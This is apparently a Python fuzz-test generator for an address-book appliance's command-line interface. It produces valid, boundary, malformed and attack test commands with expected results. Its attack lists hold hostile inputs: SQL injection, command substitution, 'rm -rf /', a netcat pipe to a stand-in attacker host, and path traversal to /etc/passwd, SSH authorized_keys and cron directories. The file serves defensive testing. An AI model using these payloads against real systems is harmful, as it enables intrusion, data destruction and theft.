#!/usr/bin/env python3
"""
Fuzz test case generator for ABA Address Book Appliance.

Generates NUM_CASES test commands and writes expected results to JSON.
Outputs commands to stdout for piping through the ABA CLI.

Architecture:
- Pre-generates all test case descriptors
- Writes expected_results.json
- Writes commands to stdout one per line with flush
"""

import json
import sys
import io
import random
import string
import uuid
import tempfile
import os
import atexit
from pathlib import Path
from typing import List, Dict, Any, Tuple
from enum import Enum

# Fix encoding for Windows (use UTF-8 instead of cp1252)
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
if sys.stderr.encoding != 'utf-8':
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# Import configuration
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from fuzz_config import *


class SessionState(Enum):
    """Session state machine for simulated user session."""
    LOGGED_OUT = 0
    LOGGED_IN_USER = 1
    LOGGED_IN_ADMIN = 2


class FuzzGenerator:
    """Main generator class for fuzzing test cases."""

    def __init__(self):
        self.cases: List[Dict[str, Any]] = []
        self.temp_files: List[str] = []
        self.session_state = SessionState.LOGGED_OUT
        self.generated_record_ids: List[str] = []
        self.seed = random.randint(0, 2**31 - 1)
        random.seed(self.seed)

    def cleanup(self):
        """Clean up temporary files created during fuzzing."""
        for filepath in self.temp_files:
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except Exception:
                pass

    def random_string(self, length: int) -> str:
        """Returns a random string of the given length using printable ASCII."""
        return "".join(
            random.choice(string.printable.replace("\n", "").replace("\r", ""))
            for _ in range(length)
        )

    def random_field(self, field_type: str, category: str) -> str:
        """
        Returns a field value appropriate for the given category.
        
        field_type: one of "name", "phone", "email", "address", "username", "password"
        category: "valid", "boundary", "malformed", "attack"
        """
        if category == "valid":
            # Realistic values
            if field_type == "name":
                names = ["John Doe", "Jane Smith", "Bob Johnson", "Alice Williams", "Charlie Brown"]
                return random.choice(names)
            elif field_type == "phone":
                return f"+1-555-{random.randint(1000, 9999)}"
            elif field_type == "email":
                domains = ["example.com", "test.local", "aba.app"]
                username = "".join(random.choices(string.ascii_lowercase, k=6))
                return f"{username}@{random.choice(domains)}"
            elif field_type == "address":
                streets = ["Oak Ave", "Maple St", "Pine Rd", "Elm Close"]
                cities = ["Springfield", "Shelbyville", "Capital City"]
                return f"{random.randint(1, 999)} {random.choice(streets)}, {random.choice(cities)}"
            elif field_type == "username":
                return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            elif field_type == "password":
                return "Pass" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
            else:
                return ""

        elif category == "boundary":
            # At or over the limit
            if field_type == "name":
                choice = random.choice(["at_limit", "over_limit", "empty"])
                if choice == "at_limit":
                    return "A" * MAX_NAME_LEN
                elif choice == "over_limit":
                    return "A" * (MAX_NAME_LEN + 1)
                else:
                    return ""
            elif field_type == "phone":
                choice = random.choice(["at_limit", "over_limit", "empty"])
                if choice == "at_limit":
                    return "1" * MAX_PHONE_LEN
                elif choice == "over_limit":
                    return "1" * (MAX_PHONE_LEN + 1)
                else:
                    return ""
            elif field_type == "email":
                choice = random.choice(["at_limit", "over_limit", "empty"])
                if choice == "at_limit":
                    return "a" * (MAX_EMAIL_LEN - 4) + "@x.c"
                elif choice == "over_limit":
                    return "a" * (MAX_EMAIL_LEN + 1) + "@x.c"
                else:
                    return ""
            elif field_type == "address":
                choice = random.choice(["at_limit", "over_limit", "empty"])
                if choice == "at_limit":
                    return "A" * MAX_ADDRESS_LEN
                elif choice == "over_limit":
                    return "A" * (MAX_ADDRESS_LEN + 1)
                else:
                    return ""
            else:
                return ""

        elif category == "malformed":
            # Random garbage
            length = random.randint(0, 500)
            return self.random_string(length)

        elif category == "attack":
            # Injection attacks
            attacks = [
                "../../../etc/passwd",
                "'; DROP TABLE users; --",
                "$({ls -la})",
                "$(whoami)",
                "`cat /etc/passwd`",
                "; rm -rf /; ",
                "| nc attacker.com 4444",
                "& powershell.exe",
                ">\x00<null>",
                "\x00\x00\x00\x00",
                "A" * 1000,
                "😈🔓💻🚀",
                "\x1b[31m\x1b[1m",  # ANSI escape codes
            ]
            return random.choice(attacks)

        return ""

    def random_uuid(self) -> str:
        """Returns a randomly generated UUID string."""
        return str(uuid.uuid4())

    def make_valid_login(self, role: str = "user") -> Tuple[str, str]:
        """Returns login command and expected pattern."""
        if role == "admin":
            cmd = f"LIN {ADMIN_USER} {ADMIN_PASSWORD}"
            self.session_state = SessionState.LOGGED_IN_ADMIN
        else:
            cmd = f"LIN {VALID_USER} {VALID_PASSWORD}"
            self.session_state = SessionState.LOGGED_IN_USER
        return cmd, PATTERN_SUCCESS

    def make_logout(self) -> Tuple[str, str]:
        """Returns logout command."""
        self.session_state = SessionState.LOGGED_OUT
        return "LOU", PATTERN_SUCCESS

    def make_add_record(self, category: str) -> Tuple[str, str, str]:
        """Returns add record command, pattern, and description."""
        record_id = uuid.uuid4().hex[:8]  # Short record ID
        name = self.random_field("name", category)
        phone = self.random_field("phone", category)
        email = self.random_field("email", category)
        address = self.random_field("address", category)

        cmd = f"ADR {record_id} SN={name} PPH={phone} PEM={email} SA={address}"

        if category == "valid":
            pattern = PATTERN_SUCCESS
            description = f"Add valid record: {name}"
        elif category == "boundary":
            pattern = PATTERN_INVALID
            description = "Add record with boundary-length fields"
        elif category == "malformed":
            pattern = PATTERN_INVALID
            description = "Add record with malformed fields"
        elif category == "attack":
            pattern = PATTERN_INVALID
            description = "Add record with injection payloads"
        else:
            pattern = PATTERN_INVALID
            description = "Add record"

        # Generate a plausible record ID for later reference
        self.generated_record_ids.append(record_id)

        return cmd, pattern, description

    def make_get_record(self, category: str) -> Tuple[str, str, str]:
        """Returns read record command."""
        if category == "valid" and self.generated_record_ids:
            record_id = random.choice(self.generated_record_ids)
            description = "Read valid record"
        else:
            record_id = self.random_uuid()[:8] if random.random() > 0.5 else self.random_field("name", category)[:8]
            if category == "attack":
                description = "Read record with malicious ID"
            else:
                description = "Read record with invalid ID"

        cmd = f"RER {record_id}"

        if category == "valid":
            pattern = PATTERN_SUCCESS
        else:
            pattern = PATTERN_INVALID
        
        return cmd, pattern, description

    def make_edit_record(self, category: str) -> Tuple[str, str, str]:
        """Returns edit record command."""
        if category == "valid" and self.generated_record_ids:
            record_id = random.choice(self.generated_record_ids)
        else:
            record_id = self.random_uuid()[:8] if random.random() > 0.5 else self.random_field("name", category)[:8]

        name = self.random_field("name", category)
        phone = self.random_field("phone", category)
        email = self.random_field("email", category)
        address = self.random_field("address", category)

        cmd = f"EDR {record_id} SN={name} PPH={phone} PEM={email} SA={address}"

        if category == "valid":
            pattern = PATTERN_SUCCESS
            description = "Edit valid record"
        else:
            pattern = PATTERN_INVALID
            description = f"Edit record with {category} inputs"

        return cmd, pattern, description

    def make_delete_record(self, category: str) -> Tuple[str, str, str]:
        """Returns delete record command."""
        if category == "valid" and self.generated_record_ids:
            record_id = random.choice(self.generated_record_ids)
            description = "Delete valid record"
        else:
            record_id = self.random_uuid()[:8] if random.random() > 0.5 else self.random_field("name", category)[:8]
            description = f"Delete record with {category} ID"

        cmd = f"DER {record_id}"

        if category == "valid":
            pattern = PATTERN_SUCCESS
        else:
            pattern = PATTERN_INVALID

        return cmd, pattern, description

    def make_import(self, category: str) -> Tuple[str, str, str]:
        """Returns import command with temporary CSV file."""
        # Create temporary file (cross-platform)
        fd, filepath = tempfile.mkstemp(prefix="aba_fuzz_import_", suffix=".csv")
        self.temp_files.append(filepath)
        
        # Default content to write
        content = None
        should_write = True

        if category == "valid":
            # Well-formed CSV with 1-5 records
            num_records = random.randint(1, 5)
            # CSV format: recordID;SN;GN;PEM;WEM;PPH;WPH;SA;CITY;STP;CTY;PC
            content = "recordID;SN;GN;PEM;WEM;PPH;WPH;SA;CITY;STP;CTY;PC\n"
            for _ in range(num_records):
                rec_id = uuid.uuid4().hex[:8]
                name = self.random_field("name", "valid")
                phone = self.random_field("phone", "valid")
                email = self.random_field("email", "valid")
                address = self.random_field("address", "valid")
                content += f'{rec_id};{name};;{email};;{phone};;{address};;;;;;;\n'
            pattern = PATTERN_SUCCESS
            description = f"Import valid CSV with {num_records} records"

        elif category == "boundary":
            # 501 records or oversized
            if random.random() > 0.5:
                num_records = 501
                content = "recordID;SN;GN;PEM;WEM;PPH;WPH;SA;CITY;STP;CTY;PC\n"
                for _ in range(num_records):
                    rec_id = uuid.uuid4().hex[:8]
                    content += f'{rec_id};Name;;;;;;;;;;;;;;\n'
                description = "Import CSV with 501 records (boundary)"
            else:
                # Create oversized file (1MB+)
                content = "recordID;SN;GN;PEM;WEM;PPH;WPH;SA;CITY;STP;CTY;PC\n"
                content += ("A;B;C;D;;E;;F;;;;;;;\n" * 100000)
                description = "Import CSV file over 1MB (boundary)"
            pattern = PATTERN_INVALID

        elif category == "malformed":
            # Invalid CSV, missing fields
            choices = [
                "recordID;SN;GN\nid;Name\n",  # Missing many fields
                "SN;GN;PEM\nName;Given;test@x.com\n",  # Missing recordID
                "recordID,SN,GN,PEM\nid,Name,Given,test@x\n",  # Wrong delimiter (comma not semicolon)
                "",  # Empty file
                "recordID;SN;GN;PEM;WEM;PPH;WPH;SA;CITY;STP;CTY;PC\n" + "A" * 10000 + "\n",  # Oversized field
            ]
            content = random.choice(choices)
            description = "Import malformed CSV"
            pattern = PATTERN_INVALID

        elif category == "attack":
            # Try injection
            if random.random() > 0.5:
                content = "recordID;SN;GN;PEM;WEM;PPH;WPH;SA;CITY;STP;CTY;PC\n"
                content += "id1;John;;test@x;;555;;../../../etc/passwd;;;;;;;\n"
                description = "Import CSV with path traversal (injection)"
            else:
                # Don't write, using malicious path
                should_write = False
                filepath = "../../etc/passwd"
                content = None
                description = "Import with path traversal"
            pattern = PATTERN_INVALID
        else:
            content = "recordID;SN;GN;PEM;WEM;PPH;WPH;SA;CITY;STP;CTY;PC\nid1;Test;;test@x;;;;;;;;;;;\n"
            pattern = PATTERN_SUCCESS
            description = "Import command"

        # Write content to file if applicable
        if should_write and content is not None:
            try:
                with os.fdopen(fd, 'w') as f:
                    f.write(content)
            except Exception:
                try:
                    os.close(fd)
                except Exception:
                    pass
        else:
            os.close(fd)

        cmd = f"IMD {filepath}"
        return cmd, pattern, description

    def make_export(self, category: str) -> Tuple[str, str, str]:
        """Returns export command."""
        if category == "valid":
            export_path = f"./exports/fuzz_out_{random.randint(1000, 9999)}.csv"
            pattern = PATTERN_SUCCESS
            description = "Export to approved directory"

        elif category == "boundary":
            # At boundary of approved dir
            export_path = "./exports/" + "A" * 200 + ".csv"
            pattern = PATTERN_INVALID
            description = "Export with boundary-length path"

        elif category == "malformed":
            choice = random.choice([
                "",  # Empty path
                "./exports/file with spaces.csv",
                "./exports/" + "A" * 200,
            ])
            export_path = choice
            pattern = PATTERN_INVALID
            description = "Export with malformed path"

        elif category == "attack":
            paths = [
                "../../etc/cron.d/x",
                "/etc/passwd",
                "/root/.ssh/authorized_keys",
                "../../proc/self/environ",
            ]
            export_path = random.choice(paths)
            pattern = PATTERN_INVALID
            description = "Export with path traversal"
        else:
            export_path = "./exports/test.csv"
            pattern = PATTERN_SUCCESS
            description = "Export"

        cmd = f"EXD {export_path}"
        return cmd, pattern, description

    def make_unauthenticated_command(self) -> Tuple[str, str, str]:
        """Returns a protected command executed without logging in."""
        commands = [
            ("ADR id1 SN=John PPH=555", "Add record"),
            ("RER id1", "Read record"),
            ("EDR id SN=John PPH=555", "Edit record"),
            ("DER id", "Delete record"),
            ("IMD /tmp/test.csv", "Import"),
            ("EXD ./exports/out.csv", "Export"),
            ("ADU newuser", "Add user"),
            ("DEU alice", "Delete user"),
            ("DAL", "Show log"),
            ("CHP newpass", "Change password"),
            ("LOU", "Logout when not logged in"),
        ]
        cmd, desc_base = random.choice(commands)
        description = f"Unauthenticated {desc_base}"
        pattern = PATTERN_DENIED
        return cmd, pattern, description

    def make_random_garbage_command(self) -> Tuple[str, str, str]:
        """Returns a completely random command."""
        garbage = self.random_string(random.randint(1, 50))
        pattern = PATTERN_INVALID
        description = f"Random garbage command"
        return garbage, pattern, description

    def make_lockout_sequence(self) -> List[Tuple[str, str, str]]:
        """Returns a sequence of 6 login attempts with wrong password."""
        username = VALID_USER
        commands = []
        
        for i in range(6):
            wrong_password = "WrongPass" + str(i)
            cmd = f"LIN {username} {wrong_password}"
            # All attempts should return invalid credentials or locked
            pattern = PATTERN_INVALID  # Covers both "Invalid credentials" and "locked"
            description = f"Wrong login attempt {i+1}/6"
            commands.append((cmd, pattern, description))
        
        return commands

    def generate_test_cases(self):
        """Generate all NUM_CASES test cases."""
        case_id = 1

        # Calculate how many of each type to ensure we meet minimums
        total_cases = NUM_CASES

        # Minimums from spec:
        min_unauthenticated = 50
        min_lockout = 30  # 30 lockout sequences = 180 commands (6 per sequence)
        min_path_traversal = 50
        min_oversized = 50
        min_cross_user = 30
        min_garbage = 100
        min_valid_flows = 150  # Reduced since first-time login interactive prompts break the pipe

        # Start with minimums
        reserved = (
            min_unauthenticated +
            (min_lockout * 6) +
            min_path_traversal +
            min_oversized +
            min_cross_user +
            min_garbage +
            min_valid_flows
        )

        remaining = total_cases - reserved

        # Generate unauthenticated attempts
        for _ in range(min_unauthenticated):
            cmd, pattern, desc = self.make_unauthenticated_command()
            self.cases.append({
                "case_id": case_id,
                "category": "attack",
                "command": cmd,
                "expected_pattern": pattern,
                "expected_pass": True,
                "description": desc,
            })
            case_id += 1

        # Generate lockout sequences  (30 sequences of 6 attempts each)
        for _ in range(min_lockout):
            sequence = self.make_lockout_sequence()
            for cmd, pattern, desc in sequence:
                self.cases.append({
                    "case_id": case_id,
                    "category": "attack",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": desc,
                })
                case_id += 1

        # Generate path traversal attempts
        for _ in range(min_path_traversal):
            if random.random() > 0.5:
                cmd, pattern, desc = self.make_import("attack")
            else:
                cmd, pattern, desc = self.make_export("attack")
            self.cases.append({
                "case_id": case_id,
                "category": "attack",
                "command": cmd,
                "expected_pattern": pattern,
                "expected_pass": True,
                "description": desc,
            })
            case_id += 1

        # Generate oversized field attempts
        for _ in range(min_oversized):
            if random.random() > 0.5:
                cmd, pattern, desc = self.make_add_record("boundary")
            else:
                cmd, pattern, desc = self.make_import("boundary")
            self.cases.append({
                "case_id": case_id,
                "category": "boundary",
                "command": cmd,
                "expected_pattern": pattern,
                "expected_pass": True,
                "description": desc,
            })
            case_id += 1

        # Generate cross-user access attempts (try to access other user's records)
        for _ in range(min_cross_user):
            # These are simulated by trying to get/edit/delete records as wrong user
            cmd, pattern, desc = random.choice([
                self.make_get_record("attack"),
                self.make_edit_record("attack"),
                self.make_delete_record("attack"),
            ])
            self.cases.append({
                "case_id": case_id,
                "category": "attack",
                "command": cmd,
                "expected_pattern": pattern,
                "expected_pass": True,
                "description": desc,
            })
            case_id += 1

        # Generate random garbage commands
        for _ in range(min_garbage):
            cmd, pattern, desc = self.make_random_garbage_command()
            self.cases.append({
                "case_id": case_id,
                "category": "malformed",
                "command": cmd,
                "expected_pattern": pattern,
                "expected_pass": True,
                "description": desc,
            })
            case_id += 1

        # Generate valid session flows (simplified - only with known credentials)
        # NOTE: We can only test with pre-configured users (alice, admin) to avoid interactive password prompts
        flows_generated = 0
        while flows_generated < min_valid_flows:
            # Simplified flow types that work with pipe input
            flow_type = random.choice(["login_only", "logout_only", "record_ops", "import_export", "sequence"])

            if flow_type == "login_only":
                # Test login with valid user or admin
                role = random.choice(["user", "admin"])
                cmd, pattern = self.make_valid_login(role)
                self.cases.append({
                    "case_id": case_id,
                    "category": "valid",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": f"Login as {role}",
                })

            elif flow_type == "logout_only":
                # Test logout
                cmd, pattern = self.make_logout()
                self.cases.append({
                    "case_id": case_id,
                    "category": "valid",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": "Logout",
                })

            elif flow_type == "record_ops":
                # Test record operations (will fail if not logged in, which is expected)
                choice = random.choice(["addrec", "getrec", "editrec", "delrec"])
                if choice == "addrec":
                    cmd, pattern, _ = self.make_add_record("valid")
                elif choice == "getrec":
                    cmd, pattern, _ = self.make_get_record("valid")
                elif choice == "editrec":
                    cmd, pattern, _ = self.make_edit_record("valid")
                else:
                    cmd, pattern, _ = self.make_delete_record("valid")
                
                self.cases.append({
                    "case_id": case_id,
                    "category": "valid",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": f"Record operation: {choice}",
                })

            elif flow_type == "import_export":
                # Test import/export
                if random.random() > 0.5:
                    cmd, pattern, _ = self.make_import("valid")
                    desc = "Import records"
                else:
                    cmd, pattern, _ = self.make_export("valid")
                    desc = "Export records"
                
                self.cases.append({
                    "case_id": case_id,
                    "category": "valid",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": desc,
                })

            elif flow_type == "sequence":
                # Minimal sequence: login -> command -> logout
                # This ensures single-command tests within a valid session
                role = random.choice(["user", "admin"])
                cmd, pattern = self.make_valid_login(role)
                self.cases.append({
                    "case_id": case_id,
                    "category": "valid",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": f"Sequence: login {role}",
                })
                case_id += 1
                flows_generated += 1

                # Add a single operation
                choice = random.choice(["addrec", "getrec", "editrec", "export"])
                if choice == "addrec":
                    cmd, pattern, _ = self.make_add_record("valid")
                elif choice == "getrec":
                    cmd, pattern, _ = self.make_get_record("valid")
                elif choice == "editrec":
                    cmd, pattern, _ = self.make_edit_record("valid")
                else:
                    cmd, pattern, _ = self.make_export("valid")
                
                self.cases.append({
                    "case_id": case_id,
                    "category": "valid",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": f"Sequence: {choice}",
                })
                case_id += 1
                flows_generated += 1

                # Add logout
                cmd, pattern = self.make_logout()
                self.cases.append({
                    "case_id": case_id,
                    "category": "valid",
                    "command": cmd,
                    "expected_pattern": pattern,
                    "expected_pass": True,
                    "description": "Sequence: logout",
                })
                case_id += 1
                flows_generated += 1
                continue

            case_id += 1
            flows_generated += 1

        # Fill remaining slots with mixed boundary/malformed/attack
        while case_id <= total_cases:
            category = random.choices(
                ["boundary", "malformed", "attack"],
                weights=[0.33, 0.33, 0.34]
            )[0]

            cmd_type = random.choice([
                "add", "get", "edit", "delete", "import", "export", "garbage"
            ])

            if cmd_type == "add":
                cmd, pattern, desc = self.make_add_record(category)
            elif cmd_type == "get":
                cmd, pattern, desc = self.make_get_record(category)
            elif cmd_type == "edit":
                cmd, pattern, desc = self.make_edit_record(category)
            elif cmd_type == "delete":
                cmd, pattern, desc = self.make_delete_record(category)
            elif cmd_type == "import":
                cmd, pattern, desc = self.make_import(category)
            elif cmd_type == "export":
                cmd, pattern, desc = self.make_export(category)
            else:
                cmd, pattern, desc = self.make_random_garbage_command()

            self.cases.append({
                "case_id": case_id,
                "category": category,
                "command": cmd,
                "expected_pattern": pattern,
                "expected_pass": True,
                "description": desc,
            })
            case_id += 1

    def write_expected_results(self):
        """Write expected_results.json before piping commands."""
        output_file = os.path.join(os.path.dirname(__file__), "expected_results.json")
        
        data = {
            "seed": self.seed,
            "total_cases": len(self.cases),
            "cases": self.cases,
        }

        with open(output_file, "w") as f:
            json.dump(data, f, indent=2)

    def write_commands(self):
        """Write commands to stdout, one per line, with flushing."""
        for case in self.cases:
            sys.stdout.write(case["command"] + "\n")
            sys.stdout.flush()

    def run(self):
        """Main entry point for generator."""
        try:
            self.generate_test_cases()
            self.write_expected_results()
            self.write_commands()
        finally:
            self.cleanup()


def main():
    atexit.register(lambda: None)
    generator = FuzzGenerator()
    atexit.register(generator.cleanup)
    generator.run()


if __name__ == "__main__":
    main()
